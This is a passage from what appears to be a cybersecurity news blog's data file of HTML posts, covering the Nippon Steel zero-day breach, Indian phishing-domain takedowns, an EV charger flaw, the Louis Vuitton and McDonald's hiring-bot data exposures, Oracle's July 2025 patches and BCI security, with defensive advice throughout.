      <ul>
        <li>⚠️ <strong>Critical infrastructure & manufacturing remain high-value targets</strong> — not just banks and tech companies.</li>
        <li>🕵️ Zero-day exploits — flaws unknown to the vendor & public — are highly effective because no patch exists when attackers strike.</li>
      </ul>
      <p>Such incidents can disrupt supply chains, hurt reputations, and erode trust in industries already under cyber siege.</p>

      <h3>The Impact</h3><br>
      <ul>
        <li>🔓 Leakage of sensitive corporate and personal data, potentially putting individuals and partners at risk of further attacks, fraud, or identity theft.</li>
        <li>📉 Loss of trust among stakeholders — partners and customers may rethink their reliance on Nippon Steel.</li>
        <li>💼 Legal & regulatory scrutiny, especially if personal data protection laws like GDPR or Japan’s APPI were violated.</li>
      </ul>

      <h3>Company’s Response</h3><br>
      <p>Nippon Steel acted promptly after discovering the breach:</p>
      <ul>
        <li>✅ Patched the vulnerability after identifying the exploit path.</li>
        <li>✅ Isolated and secured affected systems to stop further access.</li>
        <li>✅ Launched a forensic investigation with the help of cybersecurity experts and law enforcement agencies.</li>
        <li>✅ Enhanced monitoring to watch for follow-up or lateral movement attacks.</li>
      </ul>
      <p>While these actions are commendable, the incident shows how even proactive companies can be caught off-guard when the attacker has a zero-day in their arsenal.</p>

      <h3>Lessons for Other Organizations</h3><br>
      <p>Even if you’re not a manufacturing giant, the lessons are universal:</p>
      <ul>
        <li>🔍 <strong>Invest in threat intelligence</strong> to detect emerging vulnerabilities quickly.</li>
        <li>🔒 Implement <strong>network segmentation</strong> and <strong>least privilege access</strong> — to limit how much damage a single exploit can cause.</li>
        <li>📝 Audit your supply chain — third-party software and vendors can become the weakest link.</li>
        <li>🧪 Regularly conduct incident response drills — when a real attack hits, every minute counts.</li>
        <li>📊 Maintain transparent communication — keeping stakeholders informed builds trust even during a crisis.</li>
      </ul>

      <h3>Case Studies: Not an Isolated Incident</h3><br>
      <p>Zero-day attacks have hit industrial giants before:</p>
      <ul>
        <li>In 2021, a water treatment plant in Florida was compromised using an unpatched vulnerability.</li>
        <li>In 2023, a zero-day in SCADA software caused downtime at a major automotive plant in Germany.</li>
        <li>Now, Nippon Steel joins this growing list — showing the need for continuous vigilance.</li>
      </ul>

      <h3>Key Takeaway</h3><br>
      <blockquote>🎯 Even industry leaders with robust defenses are vulnerable to zero-day exploits. The battle is not just about having tools, but about staying prepared, informed, and adaptive.</blockquote>

    </div>
  `},{id:"ntro-phishing-domains-2025",title:"NTRO Detects 1,172 Phishing Domains in India",date:"2025-07-13",author:"EthicalByte",summary:"India’s NTRO identified and blocked over 1,172 phishing domains in the first half of 2025, showcasing coordinated efforts to safeguard citizens, businesses, and government from rising phishing threats.",tags:["phishing","ntro","india cybersecurity","threat intelligence","awareness"],imageKey:"ntroPhishingBanner",content:`
    <div style="padding:20px;border-radius:12px;border:1px solid #ddd;">

      <h3>🛡️ Cybersecurity News: NTRO Detects 1,172 Phishing Domains in India</h3><br>
      <p>In a significant move to safeguard India’s digital ecosystem, the <strong>National Technical Research Organisation (NTRO)</strong>, India’s premier technical intelligence agency, has detected and initiated action against <strong>1,172 phishing domains</strong> in just the first six months of 2025. This proactive operation demonstrates the increasing vigilance and capability of Indian cyber defense mechanisms in the face of rising cybercrime.</p>

      <h3>What Happened?</h3><br>
      <ul>
        <li>🇮🇳 NTRO, leveraging its advanced surveillance infrastructure and intelligence gathering, identified 1,172 phishing domains targeting Indian citizens, businesses, and government entities.</li>
        <li>🔎 These domains were designed to steal sensitive data, install malware, and impersonate legitimate organizations to deceive victims.</li>
        <li>📑 The agency briefed the findings to the Parliamentary Standing Committee on Information Technology, explaining the detection strategy and next steps.</li>
      </ul>

      <h3>Why It Matters</h3><br>
      <p>Phishing remains one of the most widely used and effective attack methods by cybercriminals. The NTRO’s findings highlight:</p>
      <ul>
        <li>🎣 The growing sophistication of phishing campaigns that often evade traditional defenses.</li>
        <li>🧲 How attackers exploit human trust — using fake websites, lookalike domains, and urgency tactics.</li>
        <li>🏛️ The vital role of government‑led monitoring to protect critical sectors and citizens from mass exploitation.</li>
      </ul>
      <p>Such operations are crucial not just for blocking attacks in real time, but also for raising awareness about the evolving nature of these threats.</p>

      <h3>NTRO’s Actions</h3><br>
      <ul>
        <li>✅ Flagged and shared the list of malicious domains with telecom operators, hosting providers, and ISPs to ensure prompt blocking.</li>
        <li>✅ Devised a collaborative <strong>matrix approach</strong> that aligns government, private sector, and service providers for faster detection and takedown of threats.</li>
        <li>✅ Ensured continued monitoring and intelligence gathering to stay ahead of emerging phishing campaigns.</li>
      </ul>

      <h3>Recommendations for Users</h3><br>
      <ul>
        <li>🔒 Be wary of unsolicited messages, emails, or SMS requesting personal, financial, or login information.</li>
        <li>🖥️ Always type website URLs manually or use bookmarks instead of clicking links in emails.</li>
        <li>🔧 Enable <strong>multi-factor authentication (MFA)</strong> to protect accounts even if credentials are compromised.</li>
        <li>📣 Report suspicious emails or websites to your organization’s IT/security team or India’s official cybercrime portal.</li>
      </ul>

      <h3>Real‑World Example</h3><br>
      <blockquote>📧 A user receives an email from “income‑tax‑india.co” prompting them to submit their PAN and banking details for a supposed refund. Thanks to NTRO’s early detection, ISPs block access to this domain before the victim can interact, preventing data theft.</blockquote>

      <h3>Looking Ahead</h3><br>
      <p>The NTRO’s initiative sets a benchmark for how public‑private collaboration can proactively counter cyber threats. As phishing tactics evolve — using AI, deepfakes, and more sophisticated lures — the need for vigilance, education, and fast response becomes even more critical. Strengthening awareness at the individual level, while enhancing intelligence at the institutional level, remains key to securing India’s cyberspace.</p>

      <h3>Key Takeaway</h3><br>
      <blockquote>🚀 Phishing is a battle of trust versus deception. NTRO’s proactive detection and blocking of malicious domains protect millions of Indians — and underscore the power of vigilance, collaboration, and preparedness.</blockquote>

    </div>
  `},{id:"ev-charging-vulnerability-2025",title:"Critical EV Charger Flaw: What Drivers and Operators Need to Know",date:"2025-07-14",author:"EthicalByte News Desk",summary:"A major vulnerability in popular EV charging stations has exposed millions of users to risks of outages, fraud, and even grid disruptions. Here’s what happened — and what you can do now.",tags:["EV","cybersecurity","vulnerability","iot security","electric vehicles"],imageKey:"evChargingVulnBanner",content:`
    <div style="background-color:#f9fbfd;padding:20px;border-radius:12px;border:1px solid #ddd;">

      <div style="text-align:center;">
        <h3 style="color:#1e2f48;">⚡ Critical EV Charger Vulnerability Uncovered</h3>
        <p style="font-style:italic;">Millions of drivers at risk. Here’s what happened — and how to stay secure.</p>
      </div>

      <section style="margin-top:20px;">
        <h4 style="color:#2563eb;">📖 The Story So Far</h4>
        <p>Earlier this week, researchers disclosed a serious security flaw in widely‑used electric vehicle (EV) charging stations. By exploiting weak authentication and poor input validation, attackers could remotely tamper with chargers worldwide. The flaw — now patched — affected multiple brands and models.</p>
      </section>

      <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
        <strong>🚗 What Could Attackers Do?</strong>
        <ul style="margin-top:10px;">
          <li>Disable or shut down entire charging stations, leaving drivers stranded.</li>
          <li>Alter billing records — letting them “charge for free” or overbill users.</li>
          <li>Overload local grids by turning multiple chargers on/off in patterns.</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#2563eb;">🔍 How Was It Discovered?</h4>
        <p>A team of cybersecurity researchers conducted a penetration test on public chargers and found they accepted unauthenticated API requests. This allowed remote control of critical functions with minimal effort — essentially leaving chargers exposed to anyone with an internet connection.</p>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#2563eb;">💡 Why This Matters</h4>
        <p>EV adoption is booming — but as cars become smarter, the infrastructure that supports them must also evolve to resist cyber threats. An insecure charger isn’t just inconvenient — it can hurt trust, cost money, and even threaten local electricity stability.</p>
      </section>

      <section style="margin-top:20px;background:#e2f0d9;padding:15px;border-radius:8px;">
        <h4 style="color:#1e7e34;">✅ What Should You Do Now?</h4>
        <ul>
          <li>🔧 Update your charger’s firmware & software immediately — vendors have issued patches.</li>
          <li>🔒 Avoid connecting to chargers via public, unsecured Wi-Fi networks if possible.</li>
          <li>📝 Review recent charging session bills to ensure accuracy.</li>
          <li>📣 Report suspicious charger behavior to the manufacturer or your service provider promptly.</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#2563eb;">📋 A Real‑World Example</h4>
        <p>One reported incident involved a fleet of EVs at a corporate parking lot, where chargers were remotely disabled just as employees were leaving for the day. This caused significant delays and showcased how disruptive even short outages can be.</p>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#2563eb;">🚀 Moving Forward</h4>
        <p>This vulnerability reminds us that convenience and security must go hand‑in‑hand. As EV infrastructure grows, so does its appeal to attackers. Building robust security into these systems from the start — and staying vigilant with updates — is the best way to keep the road ahead safe and smooth for everyone.</p>
      </section>

    </div>
  `},{id:"jack-dorsey-messaging-app-2025",title:"Jack Dorsey Launches Blockchain-Based Messaging App Without Internet",date:"2025-07-15",author:"EthicalByte",summary:"Twitter co-founder Jack Dorsey unveiled a decentralized messaging app that works without internet, using blockchain & alternative connectivity to enable communication anywhere.",tags:["blockchain","messaging","decentralized","jack dorsey","innovation"],imageKey:"jackMessagingAppBanner",content:`
    <div style="background-color:#f4f9ff;padding:20px;border-radius:12px;border:1px solid #ddd;">

      <div style="text-align:center;"><br>
        <h3 style="color:#1a1a1a;">📡 Jack Dorsey’s New Messaging App Works Without Internet</h3><br>
        <p style="font-style:italic;">Blockchain + radio waves + satellites = communication, anywhere.</p>
      </div>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">🌟 The Big Reveal</h4><br>
        <p>Jack Dorsey, co-founder of Twitter and a prominent figure in blockchain innovation, has launched a **decentralized messaging app** that doesn’t rely on traditional internet infrastructure. Instead, the app lets users communicate using radio waves, local Wi-Fi, or even satellite links.</p>
      </section>

      <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
        <strong>🚀 What Makes It Special?</strong>
        <ul style="margin-top:10px;">
          <li>Works without internet – perfect for remote areas or during outages.</li>
          <li>Leverages blockchain to ensure decentralization and security.</li>
          <li>Uses radio, Wi-Fi mesh, and satellites for flexible connectivity.</li>
          <li>Bypasses traditional telecom and government censorship.</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">🔗 Why This Matters</h4><br>
        <p>In many parts of the world, access to reliable internet is a privilege — and in some regions, information flow is deliberately restricted. A decentralized messaging platform like this promotes:</p>
        <ul>
          <li>🌍 Uninterrupted communication during natural disasters & crises.</li>
          <li>🕊️ Freedom from censorship & centralized control.</li>
          <li>🤝 Building resilient, local & global communities.</li>
        </ul>
      </section>

      <section style="margin-top:20px;background:#d4edda;padding:15px;border-radius:8px;">
        <h4 style="color:#155724;">✅ Who Can Benefit?</h4><br>
        <ul>
          <li>People in rural or underserved areas with no internet coverage.</li>
          <li>Activists & journalists operating in censored regions.</li>
          <li>Emergency responders needing reliable backup communication channels.</li>
          <li>Anyone looking for more privacy & autonomy in digital communication.</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">🛠️ How Does It Work?</h4><br>
        <p>The app combines blockchain technology (for decentralized identity & security) with alternative networks such as:</p>
        <ul>
          <li>📻 Radio frequencies to send data point-to-point locally.</li>
          <li>📶 Wi-Fi mesh networks connecting nearby devices.</li>
          <li>🛰️ Satellite uplinks to cover vast distances when nothing else is available.</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">🚀 Looking Ahead</h4><br>
        <p>This app represents a step toward internet independence — empowering people to stay connected regardless of where they are or what barriers exist. Like all disruptive innovations, its success will depend on adoption, regulation, and ongoing development.</p>
      </section>

    </div>
  `},{id:"louis-vuitton-data-breach-2025",title:"Louis Vuitton Data Breach Exposes Customer Data Across Several Countries",date:"2025-07-16",author:"EthicalByte",summary:"Luxury brand Louis Vuitton disclosed a data breach affecting customers in multiple countries, including nearly 143,000 residents in Turkey, after a third-party service provider account was compromised.",tags:["data breach","louis vuitton","luxury brand","third-party risk","customer privacy"],imageKey:"louisVuittonBreachBanner",content:`
    <div style="background-color:#f4f9ff;padding:20px;border-radius:12px;border:1px solid #ddd;">

      <div style="text-align:center;"><br>
        <h3 style="color:#1a1a1a;">⚡ Louis Vuitton Data Breach Hits Customers Globally</h3><br>
        <p style="font-style:italic;">A third-party compromise exposed sensitive data of thousands of luxury customers worldwide.</p>
      </div>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">🛑 What Happened?</h4><br>
        <p>In an official disclosure, <strong>Louis Vuitton</strong> confirmed a cyber incident where a <strong>compromised account belonging to a third-party service provider</strong> was exploited by attackers. This breach resulted in unauthorized access to personal data of customers in several countries where the brand operates.</p>
        <p>Most notably, the company revealed that approximately <strong>143,000 customers in Turkey alone</strong> were impacted — a significant figure for a luxury retailer that typically caters to an affluent, privacy-conscious clientele.</p>
      </section>

      <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
        <strong>🚨 What Data Was Exposed?</strong>
        <ul style="margin-top:10px;">
          <li>Contact details such as names, email addresses & phone numbers.</li>
          <li>Purchase histories & account preferences.</li>
          <li>Potentially, addresses & payment details — though not confirmed.</li>
          <li>Data belonging to customers in other undisclosed regions was also accessed.</li>
        </ul>
        <p>While no financial fraud has been reported yet, the exposed data could facilitate phishing attacks, identity theft, or social engineering schemes targeting high-value customers.</p>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">🌐 Why Luxury Brands Are Targeted</h4><br>
        <p>Cybercriminals view luxury brands as “soft, high-value” targets. Their clientele often includes influential, wealthy individuals whose personal data can fetch a premium on the dark web. Additionally:</p>
        <ul>
          <li>🕵 High-profile customer lists can be exploited for social engineering.</li>
          <li>💼 Luxury brands tend to rely heavily on third-party marketing & logistics vendors, increasing their attack surface.</li>
          <li>📊 Attacks can undermine brand trust, which is critical in this sector.</li>
        </ul>
        <p>Similar incidents have previously affected Gucci, Tiffany & Co., and other luxury labels.</p>
      </section>

      <section style="margin-top:20px;background:#d4edda;padding:15px;border-radius:8px;">
        <h4 style="color:#155724;">✅ Louis Vuitton’s Response</h4><br>
        <ul>
          <li>Disabled & secured the compromised vendor account.</li>
          <li>Notified impacted customers, complying with legal requirements (GDPR, local laws).</li>
          <li>Initiated a forensic investigation with external cybersecurity experts.</li>
          <li>Reviewed vendor contracts & tightened access controls for third parties.</li>
        </ul>
        <p>The company reassured customers that their financial data does not appear to have been stolen and that they are closely monitoring for fraudulent activity.</p>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">🔒 How Customers Can Protect Themselves</h4><br>
        <ul>
          <li>Change account passwords associated with Louis Vuitton services.</li>
          <li>Be wary of emails or phone calls pretending to be from Louis Vuitton asking for sensitive details.</li>
          <li>Monitor bank & credit card statements for unusual activity.</li>
          <li>Consider placing a credit freeze or fraud alert if necessary.</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">🚀 Lessons for Businesses</h4><br>
        <p>This breach highlights an all-too-common vulnerability — third-party vendor risk. Organizations must:</p>
        <ul>
          <li>Thoroughly vet vendors’ cybersecurity practices.</li>
          <li>Limit vendors’ access to only what’s necessary.</li>
          <li>Monitor vendor activity continuously for anomalies.</li>
          <li>Have an incident response plan that includes third-party breaches.</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">🎯 Final Thoughts</h4><br>
        <p>Luxury is built on trust — and in the digital age, trust requires strong cybersecurity. This incident serves as a reminder that even the most prestigious brands can fall victim to cyberattacks if they overlook their broader ecosystem.</p>
      </section>

    </div>
  `},{id:"oracle-critical-patch-july-2025",title:"Oracle Patches 309 Critical Vulnerabilities in July 2025 Update",date:"2025-07-17",author:"EthicalByte",summary:"Oracle’s July 2025 Critical Patch Update addresses 309 vulnerabilities — including remote code execution, privilege escalation, and DoS risks — across its databases, middleware, and cloud products. Enterprises should update immediately.",tags:["oracle","critical patch update","vulnerability management","cybersecurity","enterprise security"],imageKey:"oracleJuly2025PatchBanner",content:`
    <div style="background-color:#f4f9ff;padding:20px;border-radius:12px;border:1px solid #ddd;">

      <div style="text-align:center;"><br>
        <h3 style="color:#1a1a1a;">🚨 Oracle Patches 309 Critical Vulnerabilities in July 2025 Update</h3><br>
        <p style="font-style:italic;">Oracle’s quarterly Critical Patch Update fixes hundreds of flaws — some rated critical — across its entire product portfolio.</p>
      </div>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">🛑 What Happened?</h4><br>
        <p>This week, Oracle released its <strong>July 2025 Critical Patch Update (CPU)</strong>, fixing a staggering <strong>309 security vulnerabilities</strong> across dozens of Oracle products. Several of these vulnerabilities could allow attackers to:</p>
        <ul>
          <li>🧨 Execute arbitrary code remotely.</li>
          <li>📈 Escalate privileges to gain unauthorized access.</li>
          <li>🔐 Bypass authentication mechanisms.</li>
          <li>🚫 Cause denial of service (DoS) in enterprise environments.</li>
        </ul>
      </section>

      <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
        <strong>🚨 Why This Matters</strong>
        <p>Many Oracle products are deeply integrated into enterprise IT ecosystems, making them high-value targets for attackers. Unpatched vulnerabilities can lead to:</p>
        <ul>
          <li>💻 Data breaches & theft of sensitive information.</li>
          <li>🎯 Ransomware attacks & business disruption.</li>
          <li>🕵️ Persistent access & compromise of critical infrastructure.</li>
        </ul>
        <p>It’s common for attackers to reverse-engineer patches and develop exploits quickly — so timely updates are crucial.</p>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">📦 Products Affected</h4><br>
        <p>The vulnerabilities affect a wide range of products, including:</p>
        <ul>
          <li>✅ Oracle Database Server</li>
          <li>✅ Oracle Fusion Middleware</li>
          <li>✅ Oracle MySQL</li>
          <li>✅ Oracle Java SE</li>
          <li>✅ Oracle Communications applications</li>
          <li>✅ Oracle E-Business Suite</li>
          <li>… and others.</li>
        </ul>
      </section>

      <section style="margin-top:20px;background:#d4edda;padding:15px;border-radius:8px;">
        <h4 style="color:#155724;">✅ What Should Enterprises Do?</h4><br>
        <ul>
          <li>🔄 Apply patches as soon as possible, prioritizing internet-facing and mission-critical systems.</li>
          <li>🧪 Test patches in staging before production deployment.</li>
          <li>🕒 Establish a regular patching cadence and monitor for unusual activity.</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">🎯 Final Thoughts</h4><br>
        <p>Oracle’s quarterly updates are significant events for IT & security teams. With hundreds of vulnerabilities — some critical and exploitable — acting swiftly can prevent attackers from gaining a foothold in your environment.</p>
      </section>

    </div>
  `},{id:"bci-cybersecurity-july-2025",title:"🧠 Securing the Mind-Machine Highway: The Urgent Need for BCI Cybersecurity",date:"2025-07-17",author:"Annika Dubey & Dr. Neetha S S",summary:"BCIs open the brain to the digital world — and to cyberattacks. This blog explores how to secure neural interfaces against unprecedented risks and build a neuro-secure future.",tags:["BCI","brain-computer interfaces","cybersecurity","neurosecurity","future tech"],imageKey:"bciCybersecurityBanner",content:`
    <div style="background-color:#f4f9ff;padding:20px;border-radius:12px;border:1px solid #ddd;">

      <div style="text-align:center;"><br>
        <h3 style="color:#1a1a1a;">🧠 Securing the Mind-Machine Highway: The Urgent Need for BCI Cybersecurity</h3><br>
        <p style="font-style:italic;">By <a href="https://www.linkedin.com/in/annika-dubey-818060261/">Annika Dubey</a> & <a href="https://www.linkedin.com/in/dr-neetha-kala-463484248/">Dr. Neetha S S</a> | Christ University </p>
      </div>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">🚀 Introduction: The New Digital Frontier Is Inside Your Head</h4><br>
        <p>The chasm between humans and machines is rapidly shrinking, and Brain-Computer Interface (BCI) technology is set to bring about a true paradigm shift. These systems enable direct communication between the human brain and external devices, fundamentally altering communication, cognition, and control. From helping paralyzed individuals regain function to letting healthy users interact hands-free with smart devices, BCIs are transforming science fiction into reality.</p>
        <p>But this frontier also presents a sobering truth: <strong>the human brain is now part of the digital attack surface</strong>. An attack here doesn’t just compromise data — it threatens identity, autonomy, and even free will.</p>
      </section>

      <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
        <h4 style="color:#856404;">🔍 Understanding the Risk: Why BCIs Are Exceptionally Vulnerable</h4><br>
        <ul>
          <li>🔓 <strong>Non-reversible Data Leaks:</strong> Neural patterns are lifelong cognitive signatures. Once tampered with, they can’t be reset like passwords or fingerprints.</li>
          <li>🎮 <strong>Signal Hijacking & Replay Attacks:</strong> Wireless, often unencrypted communication can be intercepted and manipulated to send false signals.</li>
          <li>🧪 <strong>Behavioral Manipulation:</strong> Feedback loops can be subtly altered to change moods, perceptions, or decisions.</li>
          <li>🔬 <strong>Cognition Profiling:</strong> Attackers can extract sensitive info by analyzing specific brainwave responses to stimuli — without asking questions.</li>
          <li>⚖ <strong>Lack of Legal & Ethical Frameworks:</strong> Many jurisdictions have no rules governing neural data, leaving users vulnerable to exploitation.</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">🔧 The Solution Space: Building a Neuro-Secure BCI Ecosystem</h4><br>
        <p>Securing BCIs requires more than just technical fixes. It needs engineers, ethicists, neuroscientists, and policymakers working together. Here’s how:</p>
        <ul>
          <li>✅ <strong>Security by Design:</strong> Encrypt all neural streams; use secure firmware; develop lightweight encryption optimized for real-time neural data.</li>
          <li>✅ <strong>Cognitive Authentication:</strong> Use unique neural signatures & neural nonces for authentication alongside traditional biometrics.</li>
          <li>✅ <strong>Privacy-Aware Processing:</strong> Employ federated learning, differential privacy, pseudonymization, and data expiration policies. Treat neural data as sensitive biometrics under GDPR/HIPAA.</li>
          <li>✅ <strong>AI-Driven Neural Intrusion Detection:</strong> AI agents can spot spoofed signals, anomalies, and replay attacks in real time — much like fraud detection in banking.</li>
          <li>✅ <strong>Real-Time Control & Consent:</strong> Users must see what data is collected, allow granular permissions, and toggle a “Cognitive Safe Mode.”</li>
          <li>✅ <strong>Legal & Ethical Groundwork:</strong> Establish principles of mental privacy, cognitive liberty, and data sovereignty. Support neuro-rights initiatives worldwide.</li>
        </ul>
      </section>

      <section style="margin-top:20px;background:#d4edda;padding:15px;border-radius:8px;">
        <h4 style="color:#155724;">📋 What BCI Developers and Users Can Do Today</h4><br>
        <table style="width:100%;border-collapse:collapse;">
          <tr style="background:#e2e3e5;">
            <th style="padding:8px;border:1px solid #ddd;">Stakeholder</th>
            <th style="padding:8px;border:1px solid #ddd;">Actions</th>
          </tr>
          <tr>
            <td style="padding:8px;border:1px solid #ddd;">Developers</td>
            <td style="padding:8px;border:1px solid #ddd;">Integrate encryption, sandbox signal layers, and implement real-time neural intrusion detection systems (IDS).</td>
          </tr>
          <tr>
            <td style="padding:8px;border:1px solid #ddd;">Companies</td>
            <td style="padding:8px;border:1px solid #ddd;">Enforce ethical data policies, limit data retention, prioritize transparency.</td>
          </tr>
          <tr>
            <td style="padding:8px;border:1px solid #ddd;">Policymakers</td>
            <td style="padding:8px;border:1px solid #ddd;">Draft BCI-specific regulations and recognize neural data as sensitive biometrics.</td>
          </tr>
          <tr>
            <td style="padding:8px;border:1px solid #ddd;">End-Users</td>
            <td style="padding:8px;border:1px solid #ddd;">Use trusted hardware, disable unnecessary tracking, and stay informed about BCI security.</td>
          </tr>
        </table>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">🌟 Final Thoughts</h4><br>
        <p>BCIs may become one of the most transformative technologies of our time. But without strong cybersecurity foundations, they risk becoming tools of surveillance, coercion, and harm.</p>
        <blockquote style="border-left:4px solid #007bff;padding-left:10px;">We must treat brain signals not merely as data, but as digital extensions of the self — deserving the same dignity, privacy, and protection as our innermost thoughts.</blockquote>
      </section>

    </div>
  `},{id:"mcdonalds-ai-hiring-breach-2025",title:"🍔 McDonald’s AI Hiring Bot Exposed Millions of Applicants’ Data to Hackers",date:"2025-07-18",author:"EthicalByte",summary:"An investigation revealed that McDonald’s AI-powered chatbot, used in its hiring process, left millions of job applicants’ sensitive data exposed — with hackers trying to breach it using weak passwords like “123456”.",tags:["AI","data breach","mcdonalds","cybersecurity","privacy","hiring bots"],imageKey:"mcdonaldsAIHiringBreachBanner",content:`
    <div style="background-color:#f9f9f9;padding:20px;border-radius:12px;border:1px solid #ddd;">

      <div style="text-align:center;"><br>
        <h3 style="color:#1a1a1a;">🍔 McDonald’s AI Hiring Bot Exposed Millions of Applicants’ Data to Hackers</h3><br>
        <p style="font-style:italic;">When efficiency meets negligence: The dark side of AI in hiring processes.</p>
      </div>

      <section style="margin-top:20px;">
        <h4 style="color:#e63946;">🚨 What Happened?</h4><br>
        <p>An investigation by <a href="https://www.wired.com/story/mcdonalds-ai-hiring-chat-bot-paradoxai/" target="_blank">Wired</a> revealed that McDonald’s AI-powered hiring chatbot left millions of applicants’ sensitive data exposed to the internet. This chatbot, provided by third-party vendor Paradox AI, was designed to automate initial screening and conduct personality assessments — but it lacked basic cybersecurity controls.</p>
        <p>Researcher Carroll discovered the flaw while examining the unsettling nature of AI-driven hiring. What he found was worse than dystopian — attackers had already probed the system using the most common weak passwords imaginable, such as <strong>“123456”</strong> and <strong>“password”</strong>.</p>
      </section>

      <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
        <h4 style="color:#856404;">🤖 Why This Is a Big Deal</h4><br>
        <ul>
          <li>📄 Millions of applicants’ names, contact details, and personality test responses were potentially exposed.</li>
          <li>🔐 The system lacked strong authentication, leaving it open to brute-force attacks with trivial passwords.</li>
          <li>👀 Job seekers — often among society’s most vulnerable — were unknowingly caught in a data privacy nightmare.</li>
          <li>📉 AI-driven hiring decisions already raise ethical concerns; adding poor security to the mix erodes trust further.</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#457b9d;">🔎 How Did This Happen?</h4><br>
        <p>The AI bot ran on a web-based backend with inadequate controls:</p>
        <ul>
          <li>🚫 No enforced strong password policy for admin interfaces.</li>
          <li>⚠️ No rate-limiting to prevent brute-force login attempts.</li>
          <li>🛡️ Insufficient monitoring and alerting to detect attacks in real-time.</li>
          <li>💼 Over-reliance on a third-party vendor without sufficient audits.</li>
        </ul>
      </section>

      <section style="margin-top:20px;background:#d4edda;padding:15px;border-radius:8px;">
        <h4 style="color:#155724;">✅ What Can Be Learned?</h4><br>
        <ul>
          <li>🛠️ <strong>Security Basics Matter:</strong> Use strong, unique passwords and enforce MFA (multi-factor authentication).</li>
          <li>📋 <strong>Vendor Due Diligence:</strong> If you outsource, make sure vendors follow best practices and conduct regular audits.</li>
          <li>📈 <strong>Transparency & Accountability:</strong> Inform users how their data is used, stored, and protected.</li>
          <li>🔍 <strong>Monitor Continuously:</strong> Implement intrusion detection & alert systems to detect attacks early.</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">🌟 Final Thoughts</h4><br>
        <p>AI can streamline and improve hiring — but it cannot replace diligence, security, and ethical practices. Job seekers deserve dignity and privacy, not to have their most personal information left dangling on an unsecured server.</p>
        <blockquote style="border-left:4px solid #007bff;padding-left:10px;">“Efficiency means nothing if trust is lost. Companies must remember: with great data comes great responsibility.”</blockquote>
      </section>

      <section style="margin-top:20px;background:#e7f1ff;padding:15px;border-radius:8px;">
        <h4 style="color:#1a73e8;">📣 Actionable Takeaways for Everyone</h4><br>
        <table style="width:100%;border-collapse:collapse;">
          <tr style="background:#f1f3f4;">
            <th style="padding:8px;border:1px solid #ddd;">Stakeholder</th>
            <th style="padding:8px;border:1px solid #ddd;">What You Should Do</th>
          </tr>
          <tr>
            <td style="padding:8px;border:1px solid #ddd;">Employers</td>
            <td style="padding:8px;border:1px solid #ddd;">Vet vendors thoroughly, enforce strong security standards, and audit often.</td>
          </tr>
          <tr>
            <td style="padding:8px;border:1px solid #ddd;">Vendors</td>
            <td style="padding:8px;border:1px solid #ddd;">Follow basic cybersecurity hygiene, enforce strong authentication & monitor your systems continuously.</td>
          </tr>
          <tr>
            <td style="padding:8px;border:1px solid #ddd;">Applicants</td>
            <td style="padding:8px;border:1px solid #ddd;">Limit sensitive information shared on hiring platforms and monitor your accounts for suspicious activity.</td>
          </tr>
          <tr>
            <td style="padding:8px;border:1px solid #ddd;">Regulators</td>
            <td style="padding:8px;border:1px solid #ddd;">Establish and enforce standards for AI & data privacy in hiring processes.</td>
          </tr>
        </table>
      </section>

      
    </div>
  `},{id:"blockchain-decentralized-threat-intelligence-2025",title:"🔗 Blockchain-Enabled Decentralized Threat Intelligence Sharing: When Trust Is the Target, Decentralization Is the Shield",date:"2025-07-19",author:"Sriniketh Sudheendra & Dr. Neetha S.S",summary:"In an era where cyberattacks move faster than defenses, traditional threat intelligence systems are failing. This blog explores how blockchain-powered decentralized intelligence sharing provides the speed, resilience, and trust needed to outsmart attackers.",tags:["blockchain","threat intelligence","cybersecurity","decentralization","trust"],imageKey:"blockchainThreatIntelBanner",content:`
    <div style="background-color:#f6f8fa;padding:20px;border-radius:12px;border:1px solid #ddd;">

      <div style="text-align:center;"><br>
        <h3 style="color:#1a1a1a;">🔗 Blockchain-Enabled Decentralized Threat Intelligence Sharing</h3><br>
        <p style="font-style:italic;">When trust is under attack, decentralization becomes the shield.</p>
      </div>

      <section style="margin-top:20px;">
        <h4 style="color:#e63946;">🌐 Why We Need a New Approach</h4><br>
        <p>Modern cyberattacks don’t respect organizational boundaries. Ransomware gangs, state-sponsored groups, and hacktivists share tools and information in underground forums — collaborating faster than defenders can react. Meanwhile, defenders remain siloed, reluctant to share threat intelligence due to privacy, compliance, and competitive concerns.</p>
        <p>This mismatch creates a dangerous gap: while attackers operate like a swarm, defenders operate like islands.</p>
        <p>It’s time for defenders to adopt a more collaborative, decentralized model to keep pace with threats.</p>
      </section>

      <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
        <h4 style="color:#856404;">🚩 Shortcomings of Centralized Threat Intelligence</h4><br>
        <ul>
